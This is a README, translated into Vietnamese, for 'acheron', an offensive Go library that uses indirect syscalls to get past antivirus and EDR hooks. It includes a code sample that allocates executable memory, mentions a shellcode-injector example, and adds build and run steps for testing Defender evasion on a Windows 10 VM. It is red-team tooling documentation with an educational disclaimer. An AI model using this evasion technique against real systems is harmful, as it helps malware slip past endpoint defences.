<p align="center">
    <img src=".github/readme_banner.png" title="acheron banner" width="55%"/>
</p>
<p align="center">
    <a href="https://github.com/f1zm0/acheron/releases"><img alt="latest release version" src="https://img.shields.io/github/v/release/f1zm0/acheron?color=5c5c5c&logo=github&logoColor=white&labelColor=2b2c34"></a>
    <a href="https://pkg.go.dev/github.com/f1zm0/acheron"><img src="https://pkg.go.dev/badge/github.com/f1zm0/acheron.svg" alt="Go Reference"></a>
    <a href="https://goreportcard.com/report/github.com/f1zm0/acheron"><img src="https://goreportcard.com/badge/github.com/f1zm0/acheron#a" alt="Go Report Card"></a>
    <a href="https://github.com/f1zm0/acheron"><img src="https://img.shields.io/github/license/f1zm0/acheron?color=5c5c5c&logo=bookstack&logoColor=white&labelColor=2b2c34" alt="project license"></a>
    <a href="https://github.com/f1zm0/acheron/issues"><img alt="Issues" src="https://img.shields.io/github/issues/f1zm0/acheron?logo=dependabot&color=5c5c5c&logoColor=d9e0ee&labelColor=2b2c34"></a>
    <a href="https://twitter.com/f1zm0" target="_blank"><img alt="Twitter Follow" src="https://img.shields.io/badge/Twitter-00acee?logo=twitter&logoColor=white"></a>
</p>

## Giới thiệu

Acheron là một thư viện lấy cảm hứng từ [SysWhisper3](https://github.com/klezVirus/SysWhispers3)/[FreshyCalls](https://github.com/crummie5/FreshyCalls)/[RecycledGate](https://github.com/thefLink/RecycledGate), với hầu hết chức năng được triển khai bằng Go assembly.

Gói `acheron` có thể được sử dụng để thêm khả năng indirect syscall vào công cụ Golang của bạn, nhằm bypass AV/EDRs sử dụng usermode hooks và [instrumentation callbacks](https://winternl.com/detecting-manual-syscalls-from-user-mode/) để phát hiện các syscall bất thường không trả về ntdll.dll khi chuyển đổi từ kernel->userland.

## Tính năng chính

- Không có phụ thuộc
- Triển khai thuần Go và Go assembly
- Hỗ trợ hàm mã hóa/hash chuỗi tùy chỉnh để chống phân tích tĩnh

## Cách hoạt động

Các bước sau được thực hiện khi tạo một instance syscall proxy mới:

1. Duyệt PEB để lấy địa chỉ cơ sở của ntdll.dll trong bộ nhớ
2. Phân tích thư mục exports để lấy địa chỉ của từng hàm được export
3. Tính toán số dịch vụ hệ thống cho từng hàm `Zw*`
4. Liệt kê các gadget `syscall;ret` chưa bị hook/clean trong ntdll.dll, để sử dụng làm trampolines
5. Tạo instance proxy, có thể được sử dụng để thực hiện indirect (hoặc direct) syscalls

## Bắt đầu nhanh

Việc tích hợp `acheron` vào công cụ offsec của bạn khá dễ dàng. Bạn có thể cài đặt gói bằng:

```sh
go get -u github.com/f1zm0/acheron
```

Sau đó chỉ cần gọi `acheron.New()` để tạo một instance syscall proxy và sử dụng `acheron.Syscall()` để thực hiện indirect syscall cho các API `Nt*`.

Ví dụ tối thiểu:

```go
package main

import (
    "fmt"
    "unsafe"

    "github.com/f1zm0/acheron"
)

func main() {
    var (
        baseAddr uintptr
        hSelf = uintptr(0xffffffffffffffff)
    )

    // tạo instance Acheron, resolve SSNs, thu thập clean trampolines trong ntdll.dll, etc.
    ach, err := acheron.New()
    if err != nil {
        panic(err)
    }

    // indirect syscall cho NtAllocateVirtualMemory
    s1 := ach.HashString("NtAllocateVirtualMemory")
    if retcode, err := ach.Syscall(
        s1,                                     // hash tên hàm
        hSelf,                                  // arg1: _In_     HANDLE ProcessHandle,
        uintptr(unsafe.Pointer(&baseAddr)),     // arg2: _Inout_  PVOID *BaseAddress,
        uintptr(unsafe.Pointer(nil)),           // arg3: _In_     ULONG_PTR ZeroBits,
        0x1000,                                 // arg4: _Inout_  PSIZE_T RegionSize,
        windows.MEM_COMMIT|windows.MEM_RESERVE, // arg5: _In_     ULONG AllocationType,
        windows.PAGE_EXECUTE_READWRITE,         // arg6: _In_     ULONG Protect
    ); err != nil {
        panic(err)
    }
    fmt.Printf(
        "cấp phát bộ nhớ với NtAllocateVirtualMemory (trạng thái: 0x%x)\n",
        retcode,
    )

    // ...
}
```

## Ví dụ

Các ví dụ sau được bao gồm trong repository:

| Ví dụ                                       | Mô tả                                                                                |
| --------------------------------------------- | ------------------------------------------------------------------------------------------ |
| [sc_inject](examples/sc_inject)               | PoC injector shellcode cực kỳ đơn giản, với hỗ trợ cả direct và indirect syscalls |
| [process_snapshot](examples/process_snapshot) | Sử dụng indirect syscalls để chụp snapshot tiến trình với syscalls                            |
| [custom_hashfunc](examples/custom_hashfunc)   | Ví dụ hàm mã hóa/hash tùy chỉnh có thể sử dụng với acheron                  |

Các dự án khác sử dụng `acheron`:

- [hades](https://github.com/f1zm0/hades)

## Đóng góp

Đóng góp được chào đón! Dưới đây là một số điều sẽ tốt nếu có trong tương lai:

- [ ] Hỗ trợ 32-bit
- [ ] Các loại resolver khác (ví dụ HalosGate/TartarusGate)
- [ ] Thêm ví dụ

Nếu bạn có bất kỳ đề xuất hoặc ý tưởng nào, hãy thoải mái mở issue hoặc PR.

## Tài liệu tham khảo

- [Golang UK Conference 2016 - Michael Munday - Dropping Down Go Functions in Assembly](https://www.youtube.com/watch?v=9jpnFmJr2PE&t=1s)
- https://github.com/am0nsec/HellsGate
- https://sektor7.net/#!res/2021/halosgate.md
- https://github.com/trickster0/TartarusGate
- https://github.com/klezVirus/SysWhispers3
- https://github.com/crummie5/FreshyCalls
- https://github.com/boku7/AsmHalosGate
- https://github.com/thefLink/RecycledGate
- https://github.com/C-Sto/BananaPhone
- https://winternl.com/detecting-manual-syscalls-from-user-mode/
- https://www.usenix.org/legacy/events/vee06/full_papers/p154-bhansali.pdf
- https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low

## Ghi chú bổ sung

Tên này là tham chiếu đến sông [Acheron](https://en.wikipedia.org/wiki/Acheron) trong thần thoại Hy Lạp, là sông nơi linh hồn của người chết được chở đến thế giới ngầm.

> **Lưu ý** </br>
> Dự án này sử dụng [semantic versioning](https://semver.org/). Các bản phát hành minor và patch không nên phá vỡ tương thích với các phiên bản trước. Các bản phát hành major sẽ chỉ được sử dụng cho các thay đổi lớn phá vỡ tương thích với các phiên bản trước.

> **Cảnh báo** </br>
> Dự án này được tạo chỉ cho mục đích giáo dục. Đừng sử dụng nó trên các hệ thống bạn không sở hữu. Nhà phát triển của dự án này không chịu trách nhiệm về bất kỳ thiệt hại nào gây ra bởi việc sử dụng không đúng cách của thư viện.

## Giấy phép

Dự án này được cấp phép theo Giấy phép MIT - xem file [LICENSE](LICENSE) để biết chi tiết.

## Setup môi trường demo để bypass Windows 10

Để thiết lập môi trường demo nhằm test khả năng bypass Windows Defender trên Windows 10, hãy làm theo các bước sau. Lưu ý: Điều này chỉ phục vụ mục đích nghiên cứu và học tập trong lĩnh vực an toàn thông tin.

### Yêu cầu hệ thống:
- Máy ảo Windows 10 (khuyến nghị sử dụng VirtualBox hoặc VMware)
- Go 1.20 hoặc cao hơn
- Windows Defender được bật (mặc định)

### Các bước setup:

1. **Cài đặt Go trên Windows 10 VM:**
   - Tải Go từ https://golang.org/dl/
   - Cài đặt và thêm vào PATH

2. **Clone repository:**
   ```bash
   git clone https://github.com/f1zm0/acheron.git
   cd acheron
   ```

3. **Build examples:**
   - Cho indirect syscall (mặc định):
     ```bash
     GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o sc_inject_indirect.exe ./examples/sc_inject
     ```
   - Cho direct syscall:
     ```bash
     GOOS=windows GOARCH=amd64 go build -tags='direct' -ldflags "-s -w" -o sc_inject_direct.exe ./examples/sc_inject
     ```

4. **Chạy test:**
   - Chạy `sc_inject_indirect.exe` trên VM với Defender bật
   - Quan sát xem có bypass được không (calc.exe sẽ mở nếu thành công)
   - So sánh với direct version để thấy sự khác biệt

### Lưu ý bảo mật:
- Chỉ chạy trên máy ảo của riêng bạn
- Không sử dụng trên hệ thống production
- Mục đích chỉ là nghiên cứu học tập
